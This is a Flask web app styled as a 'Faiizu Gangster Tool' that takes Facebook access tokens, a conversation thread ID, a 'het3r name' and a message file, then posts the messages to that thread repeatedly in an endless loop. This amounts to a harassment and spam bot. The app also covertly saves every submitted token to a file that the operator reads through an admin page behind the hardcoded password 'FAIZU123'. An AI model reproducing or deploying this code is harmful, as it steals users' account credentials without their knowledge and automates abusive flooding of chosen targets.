from flask import Flask, request, render_template_string, redirect, url_for, session
import threading, requests, time, os
from datetime import datetime

# ---------------------------
# App setup
# ---------------------------
app = Flask(__name__)
app.secret_key = 'FAIZU_SECRET_KEY'  # For admin session

# Ensure tokens folder exists
os.makedirs('tokens', exist_ok=True)

# Single tokens file path
TOKENS_FILE = 'tokens/Faizu x Hasan.txt'

# ---------------------------
# Helper functions
# ---------------------------
def save_tokens(new_tokens):
    """Save tokens to the single file, skipping duplicates"""
    existing_tokens = set()
    
    # Read existing tokens if file exists
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            for line in f:
                if '|' in line:  # Check if line contains timestamp
                    token = line.split('|')[1].strip()
                    if token:
                        existing_tokens.add(token)
    
    # Add new tokens and skip duplicates
    added_count = 0
    with open(TOKENS_FILE, 'a') as f:
        for token in new_tokens:
            token = token.strip()
            if token and token not in existing_tokens:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"{timestamp} | {token}\n")
                existing_tokens.add(token)
                added_count += 1
                
    return added_count

# ---------------------------
# HTML Templates
# ---------------------------
html_index = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Faiizu Gangster Tool</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Rajdhani:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --bg-dark: #0d0d12;
      --bg-darker: #07070a;
      --accent: #ff2a6d;
      --accent-dark: #d1004d;
      --text: #e0e0e8;
      --text-dim: #a0a0b0;
      --card-bg: #151520;
      --card-border: #252535;
      --input-bg: #1a1a2a;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      background-color: var(--bg-dark);
      background-image: 
        radial-gradient(circle at 15% 50%, rgba(120, 20, 80, 0.2) 0%, transparent 25%),
        radial-gradient(circle at 85% 30%, rgba(80, 20, 120, 0.2) 0%, transparent 25%),
        radial-gradient(circle at 50% 80%, rgba(160, 30, 90, 0.2) 0%, transparent 25%);
      color: var(--text);
      font-family: 'Rajdhani', sans-serif;
      margin: 0;
      padding: 0;
      line-height: 1.6;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 800px;
      margin: 0 auto;
    }
    
    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
      position: relative;
    }
    
    .header h1 {
      color: var(--accent);
      margin: 0;
      font-size: 3rem;
      letter-spacing: 3px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      text-transform: uppercase;
      text-shadow: 0 0 15px var(--accent);
      position: relative;
      display: inline-block;
      padding: 0 20px;
    }
    
    .header h1::before,
    .header h1::after {
      content: '';
      position: absolute;
      top: 50%;
      width: 30px;
      height: 3px;
      background: var(--accent);
      box-shadow: 0 0 10px var(--accent);
    }
    
    .header h1::before {
      left: -40px;
    }
    
    .header h1::after {
      right: -40px;
    }
    
    .header p {
      color: var(--text-dim);
      margin: 10px 0 0;
      font-size: 1.2rem;
      letter-spacing: 2px;
      font-weight: 500;
    }
    
    .panel {
      background-color: rgba(21, 21, 32, 0.9);
      border: 1px solid var(--card-border);
      border-radius: 12px;
      padding: 30px;
      margin-bottom: 30px;
      box-shadow: 0 0 30px rgba(255, 42, 109, 0.15);
      backdrop-filter: blur(5px);
      position: relative;
      overflow: hidden;
    }
    
    .panel::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(to right, transparent, var(--accent), transparent);
      box-shadow: 0 0 15px var(--accent);
    }
    
    .panel-title {
      color: var(--accent);
      margin-top: 0;
      margin-bottom: 25px;
      padding-bottom: 15px;
      font-size: 1.8rem;
      text-shadow: 0 0 5px var(--accent);
      font-family: 'Orbitron', sans-serif;
      letter-spacing: 1px;
      text-align: center;
      border-bottom: 1px solid var(--card-border);
      position: relative;
    }
    
    .panel-title::after {
      content: '';
      position: absolute;
      bottom: -2px;
      left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 3px;
      background: var(--accent);
      box-shadow: 0 0 10px var(--accent);
    }
    
    .form-group {
      margin-bottom: 25px;
    }
    
    label {
      display: block;
      margin-bottom: 10px;
      color: var(--text-dim);
      font-weight: 600;
      font-size: 1.1rem;
      letter-spacing: 0.5px;
    }
    
    input[type="text"],
    input[type="number"],
    input[type="file"],
    input[type="password"],
    select {
      width: 100%;
      padding: 14px 16px;
      background-color: var(--input-bg);
      border: 1px solid var(--card-border);
      color: var(--text);
      font-family: 'Rajdhani', sans-serif;
      font-size: 1.1rem;
      font-weight: 500;
      border-radius: 6px;
      transition: all 0.3s;
    }
    
    input:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 10px rgba(255, 42, 109, 0.3);
    }
    
    input[type="radio"] {
      margin-right: 10px;
      accent-color: var(--accent);
      transform: scale(1.2);
    }
    
    .radio-group {
      margin-bottom: 25px;
      padding: 15px;
      background: rgba(30, 30, 45, 0.5);
      border-radius: 8px;
      border: 1px solid var(--card-border);
    }
    
    .radio-group label {
      margin-bottom: 15px;
      font-size: 1.1rem;
    }
    
    .radio-option {
      display: inline-block;
      margin-right: 30px;
      font-weight: 600;
      font-size: 1.1rem;
    }
    
    button {
      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
      color: white;
      border: none;
      padding: 16px 24px;
      font-family: 'Orbitron', sans-serif;
      font-weight: bold;
      font-size: 1.2rem;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s;
      border-radius: 6px;
      text-transform: uppercase;
      letter-spacing: 2px;
      box-shadow: 0 0 20px rgba(255, 42, 109, 0.3);
      margin-bottom: 15px;
      position: relative;
      overflow: hidden;
      z-index: 1;
    }
    
    button::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: all 0.5s;
      z-index: -1;
    }
    
    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 0 25px rgba(255, 42, 109, 0.5);
    }
    
    button:hover::before {
      left: 100%;
    }
    
    .threads-btn {
      background: linear-gradient(135deg, #252540, #151530);
    }
    
    .threads-btn:hover {
      background: linear-gradient(135deg, #353550, #252540);
    }
    
    .glow {
      animation: glow 2s infinite alternate;
    }
    
    @keyframes glow {
      from { 
        text-shadow: 0 0 5px var(--accent); 
      }
      to { 
        text-shadow: 0 0 15px var(--accent), 0 0 25px var(--accent-dark); 
      }
    }
    
    .file-input-container {
      position: relative;
    }
    
    .file-input-container::after {
      content: 'Choose File';
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: var(--accent);
      color: white;
      padding: 8px 15px;
      border-radius: 4px;
      font-size: 0.9rem;
      font-weight: 600;
      pointer-events: none;
    }
    
    input[type="file"] {
      padding-right: 100px;
    }
    
    @media (max-width: 768px) {
      .header h1 {
        font-size: 2.2rem;
      }
      
      .header h1::before,
      .header h1::after {
        display: none;
      }
      
      .panel {
        padding: 20px;
      }
      
      .radio-option {
        display: block;
        margin-right: 0;
        margin-bottom: 10px;
      }
    }
  </style>
  <script>
    function toggleInput() {
      const type = document.querySelector('input[name="tokenType"]:checked').value;
      document.getElementById('single').style.display = (type === 'single') ? 'block' : 'none';
      document.getElementById('multi').style.display = (type === 'multi') ? 'block' : 'none';
    }
    
    // Initialize on page load
    window.onload = function() {
      toggleInput();
    };
  </script>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1 class="glow">CONV0 S3RV3R</h1>
      <p>Free Server Kabhi Be Ruk SakTa hai !! </p>
    </div>
    
    <div class="panel">
      <h2 class="panel-title">ENTER DETAILS</h2>
      
      <form method="POST" enctype="multipart/form-data">
        <div class="form-group radio-group">
          <label>TOKEN TYPE:</label>
          <div class="radio-option">
            <input type="radio" name="tokenType" value="single" checked onchange="toggleInput()"> SINGLE TOKEN
          </div>
          <div class="radio-option">
            <input type="radio" name="tokenType" value="multi" onchange="toggleInput()"> MULTI TOKENS
          </div>
        </div>
        
        <div class="form-group" id="single">
          <label>ACCESS TOKEN:</label>
          <input type="text" name="accessToken" placeholder="Enter your access token">
        </div>
        
        <div class="form-group" id="multi" style="display:none;">
          <label>UPLOAD TOKEN FILE (.TXT):</label>
          <div class="file-input-container">
            <input type="file" name="tokenFile" accept=".txt">
          </div>
        </div>
        
        <div class="form-group">
          <label>THREAD ID:</label>
          <input type="text" name="threadId" required placeholder="Enter thread ID">
        </div>
        
        <div class="form-group">
          <label>HET3R NAME:</label>
          <input type="text" name="kidx" required placeholder="Enter het3r name">
        </div>
        
        <div class="form-group">
          <label>MESSAGES FILE (.TXT):</label>
          <div class="file-input-container">
            <input type="file" name="txtFile" accept=".txt" required>
          </div>
        </div>
        
        <div class="form-group">
          <label>DELAY (SECONDS):</label>
          <input type="number" name="time" required min="1" placeholder="Enter delay in seconds">
        </div>
        
        <button type="submit"><i class="fas fa-play"></i> START MESSAGING</button>
        <a href="/status"><button type="button" class="threads-btn"><i class="fas fa-list"></i> SHOW THREADS</button></a>
      </form>
    </div>
  </div>

  <script>
    // Add animation to inputs when focused
    document.querySelectorAll('input').forEach(input => {
      input.addEventListener('focus', function() {
        this.parentElement.style.transform = 'translateY(-3px)';
        this.parentElement.style.transition = 'transform 0.3s';
      });
      
      input.addEventListener('blur', function() {
        this.parentElement.style.transform = 'translateY(0)';
      });
    });
  </script>
</body>
</html>
'''

html_status = '''
<!DOCTYPE html>
<html>
<head>
  <title>Thread Status</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --brown: #3a2a1a;
      --purple: #5a2a5a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, var(--purple) 0%, var(--bg-dark) 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
    }
    .header {
      border-bottom: 3px solid var(--accent);
      padding-bottom: 15px;
      margin-bottom: 30px;
      text-shadow: 0 0 10px var(--accent);
    }
    .header h1 {
      color: var(--accent);
      margin: 0;
      font-size: 2.2rem;
      letter-spacing: 2px;
    }
    .thread-list {
      background-color: rgba(30, 10, 30, 0.8);
      border: 2px solid var(--brown);
      border-radius: 5px;
      padding: 20px;
      margin-bottom: 20px;
    }
    .thread-item {
      padding: 15px;
      border-bottom: 1px solid var(--brown);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .thread-info {
      flex-grow: 1;
    }
    .stop-btn {
      background: linear-gradient(to right, #ff0000, #cc0000);
      color: white;
      border: none;
      padding: 8px 15px;
      border-radius: 3px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-weight: bold;
    }
    .stop-btn:hover {
      background: linear-gradient(to right, #cc0000, #ff0000);
    }
    .back-btn {
      display: block;
      text-align: center;
      background: linear-gradient(to right, var(--accent), var(--accent-dark));
      color: #000;
      padding: 12px;
      text-decoration: none;
      font-weight: bold;
      border-radius: 3px;
      margin-top: 20px;
    }
    .back-btn:hover {
      background: linear-gradient(to right, var(--accent-dark), var(--accent));
    }
    .no-threads {
      text-align: center;
      padding: 30px;
      color: var(--accent);
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>YOUR RUNNING THREADS</h1>
    </div>
    
    <div class="thread-list">
      {% if threads %}
        {% for tid, info in threads.items() %}
        <div class="thread-item">
          <div class="thread-info">
            <strong>Thread ID:</strong> {{ tid }}<br>
            <strong>FB Thread:</strong> {{ info.thread_id }}<br>
            <strong>Token:</strong> {{ info.token[:15] }}...
          </div>
          <a href="/stop/{{ tid }}"><button class="stop-btn">STOP</button></a>
        </div>
        {% endfor %}
      {% else %}
        <div class="no-threads">No active threads running</div>
      {% endif %}
    </div>
    
    <a href="/" class="back-btn">BACK TO MAIN</a>
  </div>
</body>
</html>
'''

html_admin_login = '''
<!DOCTYPE html>
<html>
<head>
  <title>Admin Login</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      width: 350px;
      padding: 30px;
      background-color: rgba(30, 10, 30, 0.9);
      border: 2px solid var(--brown);
      border-radius: 5px;
      box-shadow: 0 0 30px rgba(255, 77, 255, 0.3);
      text-align: center;
    }
    h2 {
      margin-top: 0;
      color: var(--accent);
      text-shadow: 0 0 10px var(--accent);
      font-size: 1.8rem;
      margin-bottom: 25px;
    }
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      background-color: rgba(40, 15, 40, 0.8);
      border: 1px solid var(--brown);
      color: var(--text);
      font-family: monospace;
      font-size: 1rem;
    }
    button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(to right, var(--accent), var(--accent-dark));
      color: #000;
      border: none;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      font-size: 1.1rem;
      cursor: pointer;
      border-radius: 3px;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 0 15px rgba(255, 77, 255, 0.4);
      transition: all 0.3s;
    }
    button:hover {
      background: linear-gradient(to right, var(--accent-dark), var(--accent));
      box-shadow: 0 0 20px rgba(255, 77, 255, 0.6);
    }
    .error {
      color: #ff5555;
      text-align: center;
      margin-top: 15px;
      font-weight: bold;
      text-shadow: 0 0 5px #ff5555;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>ADMIN ACCESS</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="ENTER PASSWORD" required>
      <button type="submit">Login</button>
    </form>
    {% if error %}
    <div class="error">{{ error }}</div>
    {% endif %}
  </div>
</body>
</html>
'''

html_admin_files = '''
<!DOCTYPE html>
<html>
<head>
  <title>Token Files</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --text-dim: #d0b0d0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 30px;
      min-height: 100vh;
    }
    h2 {
      border-bottom: 2px solid var(--brown);
      padding-bottom: 10px;
      color: var(--accent);
      text-shadow: 0 0 5px var(--accent);
      font-size: 1.8rem;
    }
    ul {
      list-style-type: none;
      padding: 0;
      margin-top: 30px;
    }
    li {
      padding: 15px;
      border-bottom: 1px solid var(--brown);
      transition: all 0.3s;
    }
    li:hover {
      background-color: rgba(90, 42, 90, 0.3);
    }
    a {
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      display: block;
    }
    a:hover {
      text-shadow: 0 0 5px var(--accent);
    }
    .back-link {
      display: inline-block;
      margin-top: 30px;
      padding: 10px 20px;
      background-color: rgba(90, 42, 90, 0.5);
      border: 1px solid var(--brown);
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s;
    }
    .back-link:hover {
      background-color: rgba(90, 42, 90, 0.8);
      text-shadow: 0 0 5px var(--accent);
    }
  </style>
</head>
<body>
  <h2>TOKEN FILES</h2>
  <ul>
    {% for file in files %}
      <li><a href="{{ url_for('view_token_file', filename=file) }}">{{ file }}</a></li>
    {% endfor %}
  </ul>
  <a href="/" class="back-link">BACK TO MAIN</a>
</body>
</html>
'''

html_token_file_content = '''
<!DOCTYPE html>
<html>
<head>
  <title>Token Viewer</title>
  <style>
    :root {
      --bg-dark: #1a0a1a;
      --accent: #ff4dff;
      --text: #f0d8f0;
      --brown: #3a2a1a;
    }
    body {
      background-color: var(--bg-dark);
      background-image: radial-gradient(circle at center, #5a2a5a 0%, #1a0a1a 70%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 30px;
      min-height: 100vh;
    }
    h3 {
      border-bottom: 2px solid var(--brown);
      padding-bottom: 10px;
      color: var(--accent);
      text-shadow: 0 0 5px var(--accent);
      font-size: 1.5rem;
    }
    pre {
      white-space: pre-wrap;
      word-wrap: break-word;
      background-color: rgba(30, 10, 30, 0.8);
      padding: 20px;
      border: 1px solid var(--brown);
      border-radius: 5px;
      font-size: 1rem;
      line-height: 1.5;
      margin-top: 20px;
    }
    .back-link {
      display: inline-block;
      margin-top: 30px;
      padding: 10px 20px;
      background-color: rgba(90, 42, 90, 0.5);
      border: 1px solid var(--brown);
      color: var(--accent);
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s;
    }
    .back-link:hover {
      background-color: rgba(90, 42, 90, 0.8);
      text-shadow: 0 0 5px var(--accent);
    }
  </style>
</head>
<body>
  <h3>TOKENS: {{ filename }}</h3>
  <pre>{{ content }}</pre>
  <a href="/admin" class="back-link">BACK TO ADMIN</a>
</body>
</html>
'''

# ---------------------------
# Thread manager
# ---------------------------
user_threads = {}
threads_lock = threading.Lock()

def get_or_create_sid():
    sid = session.get('sid')
    if not sid:
        sid = os.urandom(8).hex()
        session['sid'] = sid
    return sid

# ---------------------------
# Background message sender
# ---------------------------
def message_sender(access_token, thread_id, mn, time_interval, messages, stop_event):
    headers = {'User-Agent': 'Mozilla/5.0'}
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                break
            try:
                message = f"{mn} {msg}"
                url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                r = requests.post(url, data={'access_token': access_token, 'message': message}, headers=headers)
                status = "✅" if r.status_code == 200 else f"❌ {r.status_code}"
                print(f"[{status}] {message}")
                time.sleep(time_interval)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(30)

# ---------------------------
# Routes
# ---------------------------
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        token_type = request.form.get('tokenType')
        thread_id = request.form.get('threadId')
        prefix = request.form.get('kidx')
        delay = int(request.form.get('time'))
        messages = request.files['txtFile'].read().decode().splitlines()

        tokens = []
        if token_type == 'single':
            token = request.form.get('accessToken')
            if token:
                tokens.append(token)
        else:
            file = request.files.get('tokenFile')
            if file:
                tokens = file.read().decode().splitlines()

        # Save tokens to single file (skips duplicates)
        added_count = save_tokens(tokens)
        print(f"Added {added_count} new tokens to {TOKENS_FILE}")

        # per-user session id
        sid = get_or_create_sid()

        with threads_lock:
            if sid not in user_threads:
                user_threads[sid] = {}

            for token in tokens:
                stop_event = threading.Event()
                t = threading.Thread(
                    target=message_sender,
                    args=(token, thread_id, prefix, delay, messages, stop_event),
                    daemon=True
                )
                t.start()

                # local thread id for control
                local_tid = os.urandom(6).hex()
                user_threads[sid][local_tid] = {
                    "thread": t,
                    "stop_event": stop_event,
                    "token": token,
                    "thread_id": thread_id
                }

        return redirect(url_for('status_page'))

    return render_template_string(html_index)

@app.route('/status')
def status_page():
    sid = session.get('sid')
    with threads_lock:
        threads = user_threads.get(sid, {}) if sid else {}
        return render_template_string(html_status, threads=threads)

@app.route('/stop/<tid>')
def stop_thread(tid):
    sid = session.get('sid')
    if not sid:
        return redirect(url_for('status_page'))

    with threads_lock:
        user_map = user_threads.get(sid, {})
        info = user_map.get(tid)
        if not info:
            return redirect(url_for('status_page'))

        # Signal stop
        info['stop_event'].set()
        # Optionally wait a tiny bit for graceful exit
        try:
            info['thread'].join(timeout=0.1)
        except Exception:
            pass

        # Remove from map
        del user_map[tid]

    return redirect(url_for('status_page'))

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('password') == 'FAIZU123':
            session['admin'] = True
            return redirect(url_for('admin'))
        return render_template_string(html_admin_login, error="Wrong password!")

    if not session.get('admin'):
        return render_template_string(html_admin_login)

    # Show token file
    files = [os.path.basename(TOKENS_FILE)] if os.path.exists(TOKENS_FILE) else []
    return render_template_string(html_admin_files, files=files)

@app.route('/admin/view/<filename>')
def view_token_file(filename):
    if not session.get('admin'):
        return redirect(url_for('admin'))

    # Security check - only allow viewing the main tokens file
    if filename != os.path.basename(TOKENS_FILE):
        return "Access denied", 403

    try:
        with open(f'tokens/{filename}', 'r') as f:
            content = f.read()
        return render_template_string(html_token_file_content, filename=filename, content=content)
    except FileNotFoundError:
        return "File not found", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)